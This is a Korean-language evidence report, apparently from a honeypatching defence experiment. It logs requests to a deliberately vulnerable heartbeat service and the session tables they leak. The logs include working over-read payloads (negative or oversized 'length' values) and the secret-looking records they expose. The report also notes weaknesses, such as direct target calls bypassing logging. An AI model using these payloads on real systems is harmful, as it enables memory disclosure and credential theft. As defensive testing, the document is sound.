# e. 공격 전후 타깃 세션 테이블

- 기준 커밋: `e77e5cf` (로컬 main. README만 다르고 코드는 `origin/main` `7e41b5c`와 같음, 소스 수정 없이 실행) · 실행 환경: Ubuntu (WSL2), Python 3.12.3
- 수집 스크립트: [`collect.py`](collect.py) · 원자료: [`raw.json`](raw.json) (`"e"` 키)

## 입력
허니패치 모드. 타깃(9000)에 **직접** `user-x` 세션으로 요청해 메모리를 읽는다. ① 공격 전 `{"payload":"hello","length":-1}` ② `attacker-1` 공격 hi/64 (프록시 경유) ③ 공격 후 `length -1` ④ 지시한 요청 `{"payload":"hi","length":200}` ⑤ 그 뒤 `length -1`

## 실행 명령
```bash
python3 evidence/before/collect.py    # 사례마다 타깃(해당 모드)+프록시를 새로 띄우고 일반 종료로 정리
```

## 출력
| 모드 | 단계 | 경로 | status | 응답 길이 | 진짜 비밀 | 응답 헤더(X-) | 응답 본문(앞 60자) |
|---|---|---|---|---|---|---|---|
| honeypatched | 공격 전: 타깃 직접 user-x hello/-1 (메모리 읽기) | target direct:9000 | 200 | 105 | 6 | - | `hello9f2c4e81a7b3d065\|alice\|10.0.0.23;51d8e0c29b7fa364\|bob\|1` |
| honeypatched | attacker-1 공격 hi/64 (프록시 경유) | proxy:8080 | 200 | 64 | 0 | - | `hi50b82aca3572a2bb\|4ir5b\|45.1.9.54;b83a58a9490cd4a5\|cd4\|247.` |
| honeypatched | 공격 후: 타깃 직접 user-x hello/-1 (메모리 읽기) | target direct:9000 | 200 | 141 | 6 | - | `hello9f2c4e81a7b3d065\|alice\|10.0.0.23;51d8e0c29b7fa364\|bob\|1` |
| honeypatched | 지시한 요청: 타깃 직접 user-x hi/200 | target direct:9000 | 200 | 0 | 0 | X-HP-Forked: 1 | `` |
| honeypatched | 지시한 요청 이후: 타깃 직접 user-x hello/-1 | target direct:9000 | 200 | 141 | 6 | - | `hello9f2c4e81a7b3d065\|alice\|10.0.0.23;51d8e0c29b7fa364\|bob\|1` |

## 관찰
1. 지시한 요청(④ hi/200)으로는 메모리를 볼 수 없었다. 허니패치 타깃이 위반으로 탐지해 **fork를 실행하고 빈 본문 + `X-HP-Forked: 1`** 을 돌려준다(타깃 직접 호출이라 프록시가 헤더를 지우지 않음). 이 요청 하나로 미끼 9102가 `user-x`에 할당되었다(`fork_ok user-x 9102`). 그래서 메모리는 a의 음수 length로 읽었다.
2. **공격 전(105바이트)**: alice, bob, 그리고 조회에 쓴 `user-x` 자신의 레코드. `ensure_session()`(server/app.py 92행)이 요청을 해석하기 전에 세션을 먼저 추가하기 때문이다.
3. **공격 후(141바이트)**: `0000000000000000|attacker|127.0.0.1` 레코드(36바이트)가 **타깃에 추가되어 남는다**. 공격자 세션은 미끼로 옮겨진 뒤에도 타깃 테이블에서 지워지지 않는다. user 칸은 `sid[:8]`이라 `attacker-1`이 `attacker`로 잘린다.
4. fork 때 redaction은 미끼로 보내는 사본에만 적용되고(honeypatch/hp.py 21~22행), 타깃의 진짜 테이블은 그대로다. 그래서 ③·⑤에서 진짜 비밀 6건이 그대로 읽힌다.
5. 모든 `/heartbeat` 요청이 세션을 추가하므로, 세션 ID만 바꿔 요청을 반복하면 타깃 테이블이 계속 커진다(형식이 깨진 요청도 추가됨).
6. 타깃 직접 호출은 프록시를 거치지 않아 `defender.jsonl`의 route와 `attacker.jsonl` 어디에도 남지 않는다(④의 `fork_ok`만 남음). 실제 배치에서 타깃 포트가 외부에 열려 있지 않다는 전제가 필요하다.

## 로그 발췌 (단계별 증가분, 시각 `t` 제외)

**[honeypatched] 공격 전: 타깃 직접 user-x hello/-1 (메모리 읽기)**

- 요청: `POST /heartbeat` · `X-Session-Id: user-x` · target direct:9000 · 본문 `{"payload": "hello", "length": -1}`
- 노출된 진짜 비밀: `9f2c4e81a7b3d065`, `alice`, `10.0.0.23`, `51d8e0c29b7fa364`, `bob`, `172.16.4.150`
- 응답 본문 전체: `'hello9f2c4e81a7b3d065|alice|10.0.0.23;51d8e0c29b7fa364|bob|172.16.4.150;0000000000000000|user-x|127.0.0.1'`
- defender.jsonl:
  - (기록 없음)
- attacker.jsonl:
  - (기록 없음)

**[honeypatched] attacker-1 공격 hi/64 (프록시 경유)**

- 요청: `POST /heartbeat` · `X-Session-Id: attacker-1` · proxy:8080 · 본문 `{"payload": "hi", "length": 64}`
- 응답 본문 전체: `'hi50b82aca3572a2bb|4ir5b|45.1.9.54;b83a58a9490cd4a5|cd4|247.81.6'`
- defender.jsonl:
  ```json
  {"event": "fork_ok", "session": "attacker-1", "decoy": 9101}
  {"event": "route", "session": "attacker-1", "to": "target", "status": 200}
  {"event": "route", "session": "attacker-1", "to": "decoy", "status": 200, "replay": true}
  ```
- attacker.jsonl:
  ```json
  {"event": "request", "session": "attacker-1", "mode": "honeypatched", "method": "POST", "path": "/heartbeat", "to": "decoy", "status": 200, "resp_len": 64, "leaks": 0, "body_len": 31, "payload_len": 2, "declared_len": 64, "over": 62}
  ```

**[honeypatched] 공격 후: 타깃 직접 user-x hello/-1 (메모리 읽기)**

- 요청: `POST /heartbeat` · `X-Session-Id: user-x` · target direct:9000 · 본문 `{"payload": "hello", "length": -1}`
- 노출된 진짜 비밀: `9f2c4e81a7b3d065`, `alice`, `10.0.0.23`, `51d8e0c29b7fa364`, `bob`, `172.16.4.150`
- 응답 본문 전체: `'hello9f2c4e81a7b3d065|alice|10.0.0.23;51d8e0c29b7fa364|bob|172.16.4.150;0000000000000000|user-x|127.0.0.1;0000000000000000|attacker|127.0.0.1'`
- defender.jsonl:
  - (기록 없음)
- attacker.jsonl:
  - (기록 없음)

**[honeypatched] 지시한 요청: 타깃 직접 user-x hi/200**

- 요청: `POST /heartbeat` · `X-Session-Id: user-x` · target direct:9000 · 본문 `{"payload": "hi", "length": 200}`
- 응답 본문 전체: `''`
- defender.jsonl:
  ```json
  {"event": "fork_ok", "session": "user-x", "decoy": 9102}
  ```
- attacker.jsonl:
  - (기록 없음)

**[honeypatched] 지시한 요청 이후: 타깃 직접 user-x hello/-1**

- 요청: `POST /heartbeat` · `X-Session-Id: user-x` · target direct:9000 · 본문 `{"payload": "hello", "length": -1}`
- 노출된 진짜 비밀: `9f2c4e81a7b3d065`, `alice`, `10.0.0.23`, `51d8e0c29b7fa364`, `bob`, `172.16.4.150`
- 응답 본문 전체: `'hello9f2c4e81a7b3d065|alice|10.0.0.23;51d8e0c29b7fa364|bob|172.16.4.150;0000000000000000|user-x|127.0.0.1;0000000000000000|attacker|127.0.0.1'`
- defender.jsonl:
  - (기록 없음)
- attacker.jsonl:
  - (기록 없음)
